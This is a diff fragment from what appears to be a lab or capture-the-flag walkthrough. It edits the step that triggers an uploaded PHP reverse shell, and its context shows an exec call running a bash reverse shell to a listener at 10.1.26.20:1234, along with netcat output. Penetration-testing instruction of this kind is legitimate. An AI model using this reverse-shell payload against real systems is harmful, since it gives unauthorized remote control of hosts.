@@ -398,7 +398,11 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/10.1.26.20/1234 0>&1'");
 listening on [any] 1234 ...
 ```
 
-- Run the reverse shell by going to http://10.1.26.30:80/
+- Run the reverse shell by going to http://10.1.26.30:80/rev.php
+
+
+
+
 
 
 
